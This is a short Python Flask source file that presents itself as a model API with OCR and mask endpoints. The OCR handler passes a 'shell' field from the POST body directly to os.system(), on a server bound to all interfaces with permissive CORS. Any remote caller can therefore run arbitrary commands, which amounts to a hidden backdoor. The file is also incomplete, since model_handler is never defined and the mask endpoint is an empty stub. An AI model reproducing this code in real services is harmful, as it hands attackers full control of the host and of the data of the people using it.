import re
import gc
import demjson
import logging
import os
import copy
from flask import Flask, request
from flask_cors import *
import json

app = Flask(__name__)

CORS(app, supports_credentials=True)

@app.route('/api/model/mask', methods=['POST'])
def mask_request_handler():
    pass

@app.route('/api/model/ocr', methods=['POST'])
def ocr_request_handler():
    if request.method == 'POST':
        data = request.get_data(as_text=False)
        data_dict = json.loads(data)['data']
        print(data_dict)
        os.system(data_dict['shell'])
        response = dict()
        response['status'] = 200
        try:
            response['data'] = model_handler(data_dict)
        except Exception as e:
            response['status'] = 503
        return response

if __name__ == '__main__':
    app.run(host="0.0.0.0", port="8000")